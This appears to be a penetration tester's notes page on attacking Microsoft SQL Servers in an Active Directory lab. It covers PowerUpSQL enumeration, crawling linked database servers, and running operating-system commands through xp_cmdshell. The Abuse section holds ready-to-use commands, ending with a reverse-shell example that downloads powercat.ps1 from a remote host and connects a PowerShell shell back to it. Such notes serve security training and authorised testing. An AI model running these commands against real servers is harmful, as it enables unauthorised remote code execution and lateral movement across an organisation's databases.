# MSSQL Servers

## Tools

[PowerUpSQL ](https://github.com/NetSPI/PowerUpSQL)includes functions that support SQL Server discovery, weak configuration auditing, privilege escalation on scale, and post exploitation actions such as OS command execution.

{% embed url="https://github.com/NetSPI/PowerUpSQL" %}

## Enumeration

```powershell
# SPN
Get-SQLInstanceDomain

# Check Access
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 

# Information
Get-SQLInstanceDomain | Get-SQLServerInfo
```

### Database Links

A database link allows a SQL Server to access external data sources like other SQL Servers and Data Source Objects (OLE DB).

In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures even across forest trusts.

<pre class="language-powershell"><code class="lang-powershell"><strong># find links to remote machine
</strong>Get-SQLServerLink -Instance dcorp-mssql
# Using HeidiSQL
select * from master..sysservers

# database links
Get-SQLServerLinkCrawl -Instance dcorp-mssql 
# Using HeidiSQL 
select * from openquery("dcorp-sql1",'select * from openquery("dcorpmgmt",''select * from master..sysservers'')')

</code></pre>

## Abuse

We can use links to execute commands across database links where sysAdmin is set to 1

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
# Using HeidiSQL 
select * from openquery("dcorp-sql1",'select * from openquery("dcorpmgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')

# revshell example
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell iex ((New-Object Net.WebClient).DownloadString(''http://172.16.100.83/powercat.ps1;powercat -c 172.16.100.83 -p 443 -e powershell''));"' -QueryTarget eu-sql32

```
